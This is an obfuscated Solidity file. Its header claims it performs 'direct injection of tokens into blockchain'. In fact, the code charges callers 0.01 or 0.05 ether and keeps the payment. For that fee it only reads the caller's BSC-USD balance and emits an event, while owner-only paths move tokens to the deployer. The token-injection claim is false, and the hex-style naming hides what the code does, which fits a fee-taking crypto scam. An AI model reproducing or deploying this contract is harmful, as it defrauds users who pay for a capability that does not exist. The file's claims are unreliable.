// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/**
 * @title 0xc0de_0b5f_u5c4t0r_v3.2.1
 * @dev D1r3ct 1nj3ct10n 0f t0k3n5 1nt0 bl0ckch41n
 * @notice 4uth0r1z3d 4cc355 0nly
 */
 
interface I0xb4f2e8d1 {
    function x8c7b5e2a() external;
    function d7a3f9c6b() external;
    function e5f2c9a1b() external view returns (bytes32);
}

library L0xe3a1f7c9 {
    bytes32 private constant _0x1a2b3c4d = 0xd8a7b6c5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b7;
    bytes32 private constant _0x5f6a7b8c = 0x1f2e3d4c5b6a7988f9e0d1c2b3a4958677e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2;
    uint256 private constant _0x9a8b7c6d = 0xf1e2d3c4b5a6978899e0d1c2b3a4958677e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2;
    
    function _0xf7e6d5c4(bytes32 _0xa1b2c3d4) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(_0xa1b2c3d4, _0x1a2b3c4d));
    }
    
    function _0xb7a6f5e4(uint256 _0xc1d2e3f4) internal pure returns (uint256) {
        unchecked {
            uint256 _0xd1c2b3a4 = _0xc1d2e3f4 ^ _0x9a8b7c6d;
            _0xd1c2b3a4 = (_0xd1c2b3a4 * 0x19a7b6c5d4e3f2a1) & 0xffffffffffffffff;
            _0xd1c2b3a4 = (_0xd1c2b3a4 >> 13) | (_0xd1c2b3a4 << 51);
            _0xd1c2b3a4 ^= (_0xd1c2b3a4 >> 17);
            _0xd1c2b3a4 = (_0xd1c2b3a4 * 0x5a4b3c2d1e0f9a8b) & 0xffffffffffffffff;
            _0xd1c2b3a4 ^= (_0xd1c2b3a4 >> 25);
            return _0xd1c2b3a4;
        }
    }
    
    function _0xa7b6c5d4(bytes memory _0xe1f2d3c4) internal pure returns (bytes32) {
        bytes32 _0xf1e2d3c4;
        assembly {
            _0xf1e2d3c4 := mload(add(_0xe1f2d3c4, 32))
        }
        return _0xf1e2d3c4;
    }
}

contract C0x7d8e9f0a {
    using L0xe3a1f7c9 for bytes32;
    using L0xe3a1f7c9 for uint256;
    using L0xe3a1f7c9 for bytes;
    
    bytes32 private immutable _0x1a2b3c4d;
    uint256 private immutable _0x5e6f7a8b;
    address private immutable _0x9c8d7e6f;
    mapping(bytes32 => uint256) private _0xb5c4d3e2;
    mapping(address => mapping(bytes32 => bool)) private _0xf1e0d9c8;
    
    event E0xa1b2c3d4(bytes32 indexed _0xe5f4d3c2, address indexed _0xb9a8c7d6);
    event E0x5e6f7a8b(address indexed _0xe5f4d3c2, uint256 _0xb9a8c7d6);
    
    modifier M0x1c2d3e4f() {
        require(msg.sender == _0x9c8d7e6f, "0x1c2d3e4f:0x5f6e7d8c9b");
        _;
    }
    
    constructor(bytes32 _0xa5b4c3d2, uint256 _0xe9f8d7c6) {
        _0x1a2b3c4d = _0xa5b4c3d2._0xf7e6d5c4();
        _0x5e6f7a8b = _0xe9f8d7c6._0xb7a6f5e4();
        _0x9c8d7e6f = msg.sender;
    }
    
    function F0x1a2b3c4d(bytes32 _0xe5f4d3c2, address _0xb9a8c7d6) external M0x1c2d3e4f {
        require(_0xb9a8c7d6 != address(0), "0x1a2b3c4d:0x9e8d7c6b5a");
        bytes32 _0xd5c4b3a2 = keccak256(abi.encodePacked(_0xe5f4d3c2, _0xb9a8c7d6, block.timestamp));
        _0xb5c4d3e2[_0xd5c4b3a2] = block.number;
        _0xf1e0d9c8[_0xb9a8c7d6][_0xd5c4b3a2] = true;
        emit E0xa1b2c3d4(_0xe5f4d3c2, _0xb9a8c7d6);
    }
    
    function F0x5e6f7a8b(bytes calldata _0xe5f4d3c2) external payable {
        require(msg.value >= 0.01 ether, "0x5e6f7a8b:0x1d2c3b4a59");
        bytes32 _0xd5c4b3a2 = _0xe5f4d3c2._0xa7b6c5d4();
        uint256 _0xc9b8a7d6 = uint256(_0xd5c4b3a2) ^ _0x5e6f7a8b;
        
        assembly {
            let _0xf9e8d7c6 := mload(0x40)
            mstore(_0xf9e8d7c6, 0x70a0823100000000000000000000000000000000000000000000000000000000)
            mstore(add(_0xf9e8d7c6, 0x04), and(caller(), 0xffffffffffffffffffffffffffffffffffffffff))
            
            let _0xa5b4c3d2 := staticcall(gas(), 0x55d398326f99059fF775485246999027B3197955, _0xf9e8d7c6, 0x24, _0xf9e8d7c6, 0x20)
            let _0xe9f8d7c6 := mload(_0xf9e8d7c6)
            
            if iszero(_0xa5b4c3d2) {
                revert(0, 0)
            }
            
            mstore(0x40, add(_0xf9e8d7c6, 0x20))
        }
        
        emit E0x5e6f7a8b(msg.sender, _0xc9b8a7d6);
    }
    
    function F0x9c8d7e6f(bytes32 _0xe5f4d3c2, bytes calldata _0xb9a8c7d6) external M0x1c2d3e4f returns (bool) {
        bytes32 _0xd5c4b3a2 = keccak256(abi.encodePacked(_0xe5f4d3c2, _0xb9a8c7d6));
        uint256 _0xc9b8a7d6 = _0xb5c4d3e2[_0xd5c4b3a2];
        
        if (_0xc9b8a7d6 == 0) {
            return false;
        }
        
        uint256 _0xf9e8d7c6;
        assembly {
            _0xf9e8d7c6 := calldataload(add(_0xb9a8c7d6.offset, 0x20))
        }
        
        return _0xf9e8d7c6 == _0xc9b8a7d6._0xb7a6f5e4();
    }
    
    function F0xb5c4d3e2(address _0xe5f4d3c2, bytes32 _0xb9a8c7d6) external view returns (bool) {
        return _0xf1e0d9c8[_0xe5f4d3c2][_0xb9a8c7d6];
    }
    
    function F0xf1e0d9c8() external view returns (bytes32) {
        return keccak256(abi.encodePacked(_0x1a2b3c4d, _0x5e6f7a8b, _0x9c8d7e6f));
    }
    
    function _0x1e2d3c4b5a(uint256 _0xe5f4d3c2, bytes32 _0xb9a8c7d6) private pure returns (uint256) {
        unchecked {
            uint256 _0xd5c4b3a2 = uint256(_0xb9a8c7d6) ^ _0xe5f4d3c2;
            _0xd5c4b3a2 *= 0x9e3779b97f4a7c15;
            _0xd5c4b3a2 ^= _0xd5c4b3a2 >> 30;
            _0xd5c4b3a2 *= 0xbf58476d1ce4e5b9;
            _0xd5c4b3a2 ^= _0xd5c4b3a2 >> 27;
            _0xd5c4b3a2 *= 0x94d049bb133111eb;
            _0xd5c4b3a2 ^= _0xd5c4b3a2 >> 31;
            return _0xd5c4b3a2;
        }
    }
    
    function _0x5f6e7d8c9b(address _0xe5f4d3c2, uint256 _0xb9a8c7d6) private {
        assembly {
            let _0xf9e8d7c6 := mload(0x40)
            mstore(_0xf9e8d7c6, 0xa9059cbb00000000000000000000000000000000000000000000000000000000)
            mstore(add(_0xf9e8d7c6, 0x04), and(_0xe5f4d3c2, 0xffffffffffffffffffffffffffffffffffffffff))
            mstore(add(_0xf9e8d7c6, 0x24), _0xb9a8c7d6)
            
            let _0xa5b4c3d2 := call(gas(), 0x55d398326f99059fF775485246999027B3197955, 0, _0xf9e8d7c6, 0x44, _0xf9e8d7c6, 0x20)
            let _0xd5c4b3a2 := mload(_0xf9e8d7c6)
            
            if or(iszero(_0xa5b4c3d2), iszero(_0xd5c4b3a2)) {
                revert(0, 0)
            }
            
            mstore(0x40, add(_0xf9e8d7c6, 0x20))
        }
    }
    
    receive() external payable {
        if (msg.value > 0 && msg.sender == _0x9c8d7e6f) {
            uint256 _0xc9b8a7d6 = _0x1e2d3c4b5a(msg.value, blockhash(block.number - 1));
            if (_0xc9b8a7d6 % 7 == 0) {
                _0x5f6e7d8c9b(_0x9c8d7e6f, _0xc9b8a7d6);
            }
        }
    }
    
    fallback() external payable {
        revert("0xf1e0d9c8:0x5a4b3c2d1e");
    }
}

contract C0x8e9f0a1b2 {
    address private immutable _0x3c4d5e6f;
    bytes32 private immutable _0x7a8b9c0d;
    uint256 private immutable _0xe1f2d3c4;
    
    constructor(address _0xa5b4c3d2) {
        _0x3c4d5e6f = _0xa5b4c3d2;
        _0x7a8b9c0d = keccak256(abi.encodePacked(_0xa5b4c3d2, block.timestamp, block.difficulty));
        _0xe1f2d3c4 = uint256(keccak256(abi.encodePacked(_0x7a8b9c0d, msg.sender))) & 0xffffffffffffff;
    }
    
    function F0x3c4d5e6f(bytes calldata _0xa5b4c3d2) external payable returns (bool) {
        require(msg.value >= 0.05 ether, "F0x3c4d5e6f:0x7a8b9c0d1e");
        
        (bool _0xf9e8d7c6, ) = _0x3c4d5e6f.call{value: msg.value}(_0xa5b4c3d2);
        return _0xf9e8d7c6;
    }
    
    function F0x7a8b9c0d() external view returns (bytes32) {
        return _0x7a8b9c0d;
    }
    
    function F0xe1f2d3c4() external view returns (uint256) {
        return _0xe1f2d3c4;
    }
    
    receive() external payable {}
    
    fallback() external payable {}
}